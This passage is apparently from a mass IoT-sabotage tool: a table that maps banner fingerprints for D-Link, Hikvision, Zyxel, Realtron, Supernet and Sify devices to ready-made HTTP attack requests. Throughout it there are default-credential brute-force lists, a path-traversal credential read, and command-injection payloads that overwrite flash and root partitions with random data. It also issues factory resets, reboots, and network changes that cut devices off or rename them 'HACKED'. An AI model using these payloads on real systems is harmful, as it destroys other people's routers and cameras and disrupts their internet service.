  	'GET /goform/network?cmd=set&enabledhcp=0&ipaddress=10.%%RAND8%%&subnetmask=255.255.255.0&defaultgateway=10.%%COMP8%%&autodns=0&dnsserver.primary=1.2.3.4&dnsserver.standby=1.2.3.5&httpport=80 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\n\r\n',
  	'GET /goform/date_time?cmd=set&updatemode=1&ntpserverenable=1&ntpserver=%2560cat%2520%252Fdev%252Furandom%2520%253E%252Fdev%252Froot%2560&ntpupdateinterval=60&timezone=25&deftimezone=&enable_dst=0&dst_str=GMT-03%253A30MDT-04%253A30%252CM1.1.0%252F00%253A00%253A00%252CM2.1.0%252F00%253A00%253A00 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\n\r\n',
  	'POST /goform/maintenance?cmd=set&restart=yes HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
  ],
  
  # DIR 300 and DIR 600 RCE
  [ 'dir300600', '(DIR-600 Ver 2\.1[1234]|DIR-300 Ver 2\.1[23])',
  	'POST /command.php HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ncmd=route del default;iproute del default;ip route del default;cat /dev/urandom >/dev/mtdblock/0;cat /dev/urandom >/dev/mtdblock/1;cat /dev/urandom >/dev/mtdblock/2;cat /dev/urandom >/dev/mtdblock/3;cat /dev/urandom >/dev/mtdblock/4;cat /dev/urandom >/dev/mtdblock/5;cat /dev/urandom >/dev/mtdblock/6;cat /dev/urandom >/dev/mtdblock/7;cat /dev/urandom >/dev/root;cat /dev/urandom >/dev/mem;',
    'GET / HTTP/1.0\r\n\r\n',
  ],
  
  # DIR850 - get pw for now - then figure out breaking captcha and/or hmac calcs on stack2
  [ 'dir850', 'Server: Linux, HTTP.*DIR-850L Ver', 
  	'POST /hedwig.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-type: text/xml\r\nCookie: uid=aDxpxsreSa\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version=\'1.0\' encoding=\'UTF-8\'?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>',
  	'GET /authentication.cgi HTTP/1.0\r\n\r\n',
  ],

  # hikvision login
  [ 'hikweb', '(Server: (DNVRS-Webs|DVS-Webs|App-webs|DVRDVS-Webs|Hikvision-Webs|web)|\/doc\/page\/login\.asp\?_|Length: 480;Cont)',
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU=\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/12345
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/admin
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/1234
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46ODg4ODg4\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/888888
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46NTQzMjE=\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/54321
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU2\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/123456
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTExMTEx\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/111111
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46NjU0MzIx\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/654321
    'GET /PSIA/Custom/SelfExt/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU2Nzg5YWJj\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/123456789abc
    # montecrypto/bashis exploit as last login action, will skip to end from here
    'PUT /System/factoryDefault?auth=YWRtaW46MTEK&mode=full HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',		# n/a
    'PUT /System/reboot?auth=YWRtaW46MTEK HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',		# n/a
    # disable telnet
  	'PUT /ISAPI/System/Network/telnetd?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<Telnetd><enabled>false</enabled></Telnetd>',
  	# telnet does not exist on the PSIA-only units?
  	# random ip
  	'PUT /ISAPI/System/Network/interfaces/1?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<NetworkInterface><id>1</id><IPAddress><ipVersion>dual</ipVersion><addressingType>static</addressingType><ipAddress>10.%%RAND8%%</ipAddress><subnetMask>255.255.255.0</subnetMask><DefaultGateway><ipAddress>10.%%COMP8%%</ipAddress></DefaultGateway><PrimaryDNS><ipAddress>1.2.3.4</ipAddress></PrimaryDNS><SecondaryDNS><ipAddress>1.2.3.5</ipAddress></SecondaryDNS></IPAddress><Link><MACAddress>8c:e7:48:35:ad:e4</MACAddress><autoNegotiation>true</autoNegotiation><speed>0</speed><duplex>full</duplex><MTU>1500</MTU></Link></NetworkInterface>',
  	'PUT /PSIA/System/Network/interfaces/1?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<NetworkInterface><id>1</id><IPAddress><ipVersion>dual</ipVersion><addressingType>static</addressingType><ipAddress>10.%%RAND8%%</ipAddress><subnetMask>255.255.255.0</subnetMask><DefaultGateway><ipAddress>10.%%COMP8%%</ipAddress></DefaultGateway><PrimaryDNS><ipAddress>1.2.3.4</ipAddress></PrimaryDNS><SecondaryDNS><ipAddress>1.2.3.5</ipAddress></SecondaryDNS></IPAddress><Link><MACAddress>8c:e7:48:35:ad:e4</MACAddress><autoNegotiation>true</autoNegotiation><speed>0</speed><duplex>full</duplex><MTU>1500</MTU></Link></NetworkInterface>',
  	# alt unit
  	'PUT /PSIA/System/Network/interfaces/1?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<NetworkInterface><id>1</id><IPAddress><ipVersion>dual</ipVersion><addressingType>static</addressingType><ipAddress>10.%%RAND8%%</ipAddress><subnetMask>255.255.255.0</subnetMask><DefaultGateway><ipAddress>10.%%COMP8%%</ipAddress></DefaultGateway><ipV6AddressingType>ra</ipV6AddressingType><PrimaryDNS><ipAddress>1.2.3.4</ipAddress></PrimaryDNS><SecondaryDNS><hostName>1.2.3.5</hostName></SecondaryDNS></IPAddress><Link><MACAddress>8c:e7:48:35:ad:e4</MACAddress><autoNegotiation>true</autoNegotiation><speed>0</speed><duplex>full</duplex><MTU>1500</MTU></Link></NetworkInterface>',
  	# disable pppoe
  	'PUT /ISAPI/System/Network/PPPoE/1?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<PPPoE><id>1</id><enabled>false</enabled><ethernetIfId>1</ethernetIfId><userName></userName><password></password></PPPoE>',
  	# pppoe does not exist on PSIA-only units?
  	# factory reset
  	'PUT /ISAPI/System/factoryReset?mode=full?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
  	'PUT /PSIA/System/factoryReset?mode=full?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
  	# some units need explicit reboot
  	'PUT /PSIA/System/reboot?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
  ],


  # mainly seen Sifytech branded units out there, but also EnGadget.. unsure of white label?
  # web UI for the egcpa telnet payload
	[ 'sify', '200 OK.*Accept-Ranges: bytes.*Expires.*content=-1.*0; URL=/cgi-bin/luci',
	  'POST /cgi-bin/luci/;stok=15443bacdb9a6ddd5df893eef7cbb995 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npage=login&username=admin&password=admin',
	  'GET /cgi-bin/luci/;strok=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: sysauth=%%CUSTOM2%%\r\n\r\n',
	  # customer location, potential RCE here (executed later)
	  'POST /cgi-bin/luci/;stok=%%CUSTOM1%%/html/CM_Location HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: sysauth=%%CUSTOM2%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ncname=%60dd+if%3D%2Fdev%2Fzero+of%3D%2Fdev%2Froot%60&lname=%60dd+if%3D%2Fdev%2Fzero+of%3D%2Fdev%2Froot%60&email=N%2FA&phone=1&linkid=4028151015&linkid2=N%2FA&linkid3=N%2FA&linkid4=N%2FA',
	  # wifi warning
	  'POST /cgi-bin/luci/;stok=%%CUSTOM1%%/html/SIFYOS_WLAN HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: sysauth=%%CUSTOM2%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWLANMode=11na&WLANChannel=36&WLANaSSID=sify-is-HACKED&WLANPreferBSSID=50%3AFE%3AF2%3A00%3AC5%3A3C&secMode=none&passphrase=&ChanBwMode=0&reqfile=ST_WLAN&actionCheckBoxMgr=PreferBSSIDEnable&actionCfgSave=&actionWLANDriverApplyCfg=',
		# set WAN IP (confusingly this actually is LAN IP)
	  'POST /cgi-bin/luci/;stok=%%CUSTOM1%%/html/WANSettings_StaticIP HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: sysauth=%%CUSTOM2%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nWANConnectionType=2&WANGeneralAccount=&WANGeneralDomain=&WANMTUMode=0&WANGeneralIP=10.%%RAND8%%&wgip1=10&wgip2=%%RAND81%%&wgip3=%%RAND82%%&wgip4=%%RAND83%%&WANGeneralSubnetMask=255.255.255.0&wgsm1=255&wgsm2=255&wgsm3=255&wgsm4=0&WANGeneralGateway=10.%%COMP8%%&wggw1=10&wggw2=%%COMP81%%&wggw3=%%COMP82%%&wggw4=%%COMP83%%&WANDNSSourc=1&WANPrimaryDNSIP=0.0.0.0&wpdns1=0&wpdns2=0&wpdns3=0&wpdns4=0&WANSecondaryDNSIP=0.0.0.0&wsdns1=0&wsdns2=0&wsdns3=0&wsdns4=0&WANGeneralMACSel=0&WANGeneralMAClone=00%3A00%3A00%3A00%3A55%3A00&mac=%40%23statusRemotePCMAC%23%24&actionCfgSave=&wnat=chknat&igateway=icommit&reqfile=WANSettings_StaticIP&actionWANApplyCfg=',
		# LAN IP (confusingly this is actually the WAN IP)
		'POST /cgi-bin/luci/;stok=%%CUSTOM1%%/html/LANSettings HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: sysauth=%%CUSTOM2%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nLANIP=10.%%COMP8%%&lip1=10&lip2=%%COMP81%%&lip3=%%COMP82%%&lip4=%%COMP83%%&LANSubnetmask=255.255.255.254&lsm1=255&lsm2=255&lsm3=255&lsm4=254&LANDHCPSrvStartAddr=192.168.1.100&LANDHCPSrvStopAddr=192.168.1.200&LANWINSAddr=0.0.0.0&reqfile=LANSettings&actionCheckBoxMgr=LANDHCPSrvEnable&actionCheckBoxMgr=DSTEnable&actionCheckBoxMgr=RAEnable&actionCfgSave=&actionLANApplyCfg=',
    # save/apply required for some newer EnGadget specific units		
		'GET /cgi-bin/luci/;stok=%%CUSTOM1%%/html/uci/saveapply?formname=CM_ConfigChanges HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: sysauth=%%CUSTOM2%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nLANIP=10.%%COMP8%%&lip1=10&lip2=%%COMP81%%&lip3=%%COMP82%%&lip4=%%COMP83%%&LANSubnetmask=255.255.255.254&lsm1=255&lsm2=255&lsm3=255&lsm4=254&LANDHCPSrvStartAddr=192.168.1.100&LANDHCPSrvStopAddr=192.168.1.200&LANWINSAddr=0.0.0.0&reqfile=LANSettings&actionCheckBoxMgr=LANDHCPSrvEnable&actionCheckBoxMgr=DSTEnable&actionCheckBoxMgr=RAEnable&actionCfgSave=&actionLANApplyCfg=',
		# try some RCE luv
#		'POST /cgi-bin/luci/;stok=%%CUSTOM1%%/html/CM_TimeSettings HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: sysauth=%%CUSTOM2%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nTimeSettingMode=1&TimeZone=UTC-5%3A30&UserNTPSrvMode=1&UserNTPSrvIP=%60reboot%60&reqfile=CM_TimeSettings&actionCheckBoxMgr=UserNTPSrvMode&actionTimeApplyCfg=&actionCfgSave=',
    'GET / HTTP/1.0\r\n\r\n',
  ],

	# Zyxel P660R and maybe others
	[ 'zyxelp660', 'RomPager.*Welcome to the Web-Based Configurator.*GoLive Cyber',
	  'POST /Forms/rpAuth_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nLoginPassword=ZyXEL+ZyWALL+Series&hiddenPassword=81dc9bdb52d04dc20036dbd8313ed055&Prestige_Login=Login', # pw 1234
	  'POST /Forms/rpAuth_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nLoginPassword=ZyXEL+ZyWALL+Series&hiddenPassword=21232f297a57a5a743894a0e4a801fc3&Prestige_Login=Login', # pw admin
	  'POST /Forms/LAN_IP_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nLANIPAddr=10.%%RAND8%%&LANSubnetMask=255.255.255.254&sysSubmit=Apply',
	  'POST /Forms/LAN_DHCPSetup_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nDHCP_Mode=00000001&sysPoolStartingAddr=192.168.%%RAND16%%&sysPoolCount=32&DHCPPriDNSAddr=1.2.3.4&DHCPSecDNSAddr=1.2.3.5&sysSubmit=Apply',
	  'POST /Forms/WAN_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nwan_RemoteName=HACKED&wan_Mode=00000001&wanModeFlag=0&wan_Encapsulation=PPPoA&wanEncapFlag=0&wan_UserName=hacked&wan_Password=hacked&wan_ServiceName=&wan_Multiplex=LLC&wan_VPI=8&wan_VCI=35&wan_DynIP=DynamicIP&wan_ConnectSel=Conn_on_Demand&wan_IdleTime=0&WANApply=Apply',
    'GET / HTTP/1.0\r\n\r\n',
	],  
	
	# Realtron D-LINK DSL-2740 used by BSNL, VNPT, PLDT Prolink MyDSL
	[ 'realtron', '401.*Server:Realtron WebServer.*Basic realm=index.htm',
	  'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',  # admin/admin
	  'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',  # admin/admin
	  'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n',  # admin/1234
	  'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=\r\n\r\n',  # admin/password
	  'POST /form2WlanSetup.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nwlanDisabled=ON&save=Apply+Changes&basicrates=0&operrates=0&submit.htm%3Fwlbasic.htm=Send',
	  'POST /form2WlanSetup.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nwlanDisabled=ON&save=Apply+Changes&basicrates=0&operrates=0&submit.htm%3Fwlbasic.htm=Send',
	  'POST /form2Dhcpd.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nlan_ip=192.168.1.1&lan_mask=255.255.255.0&dhcpmode=0&lan1=lan1&lan2=lan2&lan3=lan3&lan4=lan4&wlan=wlan&vap0=vap0&vap1=vap1&vap2=vap2&vap3=vap3&dhcpRangeStart=192.168.1.2&dhcpRangeEnd=192.168.1.254&dhcpSubnetMask=255.255.255.0&dfgw=192.168.1.1&ltime=1440&dname=domain.name&dns1=192.168.1.1&dns2=&dns3=&relayaddr=192.168.2.242&submit.htm%3Fdhcpd.htm=Send&save=Apply+Changes',
	  'POST /form2Dhcpd.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nlan_ip=192.168.1.1&lan_mask=255.255.255.0&dhcpmode=0&lan1=lan1&lan2=lan2&lan3=lan3&lan4=lan4&wlan=wlan&vap0=vap0&vap1=vap1&vap2=vap2&vap3=vap3&dhcpRangeStart=192.168.1.2&dhcpRangeEnd=192.168.1.254&dhcpSubnetMask=255.255.255.0&dfgw=192.168.1.1&ltime=1440&dname=domain.name&dns1=192.168.1.1&dns2=&dns3=&relayaddr=192.168.2.242&submit.htm%3Fdhcpd.htm=Send&save=Apply+Changes',
	  'POST /form2lansetup.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nip=10.%%RAND8%%&mask=255.255.255.0&ip2=0.0.0.0&mask2=0.0.0.0&snoop=1&submit.htm%3Ftcpiplan.htm=Send',
	  'POST /form2lansetup.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nip=10.%%RAND8%%&mask=255.255.255.0&ip2=0.0.0.0&mask2=0.0.0.0&snoop=1&submit.htm%3Ftcpiplan.htm=Send',
	  'POST /form2AttenSave.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsubmit.htm%3Fattention.htm=Send',
	  'POST /form2AttenSave.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsubmit.htm%3Fattention.htm=Send',
	  'POST /form2WanAdsl.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=0&idx=0&connid=15&submit.htm%3Fwanadsl_auto_droute.htm=Send',
	  'POST /form2WanAdsl.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=0&idx=0&connid=15&submit.htm%3Fwanadsl_auto_droute.htm=Send',
	  'POST /form2WebRefresh.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npppoenum=2&connect=disconnect&submit.html%3Fstatus_wan.htm=Send',
	  'POST /form2WebRefresh.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npppoenum=2&connect=disconnect&submit.html%3Fstatus_wan.htm=Send',
	  'POST /form2WanPhy.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nphyType=1&submit.htm%3Fwanadsl_auto_droute.htm=Send',
	  'POST /form2WanPhy.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nphyType=1&submit.htm%3Fwanadsl_auto_droute.htm=Send',
    'GET / HTTP/1.0\r\n\r\n',
	],  
	
  # Indian Supernet Infocomm modems, used by BSNL at least
  [ 'supernet', '401 Unauthorized.*realm=ADSL Modem.*Server: WebServer/1.0',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n',  # admin/admin
    'POST /Forms/home_lan_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nuiViewIPAddr=10.%%RAND8%%&dhcpFlag=0&ipAddrMain=10.%%RAND8%%&uiViewNetMask=255.255.255.0&uiViewIPAddr2=0.0.0.0&ipAddrAlias=0.0.0.0&uiViewNetMask2=0.0.0.0&MorAFlag=0&lan_RIPVersion=RIP1&lan_RIPDirection=None&lan_IGMP=Disabled&igmp_snoop_act=0&mld_snoop_act=0&dhcpTypeRadio=0&lan_IPv6RadvdEnable=0&lan_IPv6RadvdMode=0&lan_IPv6AutoPrefix=0&lan_Ipv6Address0=2005%3A%3A&lan_Ipv6Address1=64&lan_Ipv6PreLifetime=604800&lan_IPv6ValidLifetime=2592000&lan_ManagedAddr=on&lan_OtherConfig=on&lan_IPv6DHCP6Server=0&lan_IPv6DHCP6Mode=0&lan_Ipv6DHCP6Address0=%3A%3A&lan_Ipv6DHCP6Address1=0&lan_Ipv6DHCP6PreLifetime=0&lan_IPv6DHCP6ValidLifetime=0&lan_IPv6DHCP6DNSServer1=%3A%3A&lan_IPv6DHCP6DNSServer2=%3A%3A',
    'POST /Forms/home_wlan_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nwlanWEBFlag=0&AccessFlag=1&wlan_APenable=0&Channel_ID=00000000&BeaconInterval=100&RTSThreshold=2347&FragmentThreshold=2346&DTIM=1&WirelessMode=802.11b%2Bg%2Bn&WLANChannelBandwidth=40+MHz&WLANGuardInterval=AUTO&WLANMCS=AUTO&WLSSIDIndex=1&ESSID_HIDE_Selection=0&ESSID=HACKED&WEP_Selection=WPA-PSK%2FWPA2-PSK&TKIP_Selection=TKIP%2FAES&PreSharedKey=4171258257&WLAN_FltActive=0&WLAN_FltAction=00000000&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLanLockFlag=0&wlanRadiusWEPFlag=0',
    'POST /Forms/home_wlan_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nwlanWEBFlag=0&AccessFlag=1&wlan_APenable=0&Channel_ID=00000000&BeaconInterval=100&RTSThreshold=2347&FragmentThreshold=2346&DTIM=1&WirelessMode=802.11b%2Bg%2Bn&WLANChannelBandwidth=40+MHz&WLANGuardInterval=AUTO&WLANMCS=AUTO&WLSSIDIndex=1&ESSID_HIDE_Selection=0&ESSID=HACKED&WEP_Selection=WPA-PSK%2FWPA2-PSK&TKIP_Selection=TKIP%2FAES&PreSharedKey=4171258257&WLAN_FltActive=0&WLAN_FltAction=00000000&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLANFLT_MAC=00%3A00%3A00%3A00%3A00%3A00&WLanLockFlag=0&wlanRadiusWEPFlag=0',
    'POST /Forms/home_wan_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nHiddenFlag=0&wan_VC=PVC0&wanVCFlag=0&Alwan_VPI=0&Alwan_VCI=35&Alwan_QoS=nrtVBR&wan_PCR=0&wan_SCR=0&wan_MBS=0&wanIPVersionRadio=1&wanConTypeFlag=0&wanTypeRadio=Three&wan_IPv6DSLiteEnable=0&wan_IPv6DSLiteMode=0&wan_RemoteAddress=%3A%3A&wan_BridgeSelect=2684+Bridged+IP+LLC&BridgeFlag=0&wanIGMPQitFlag=0&wan_PVCO_Flag=0&PageLockValue=0',
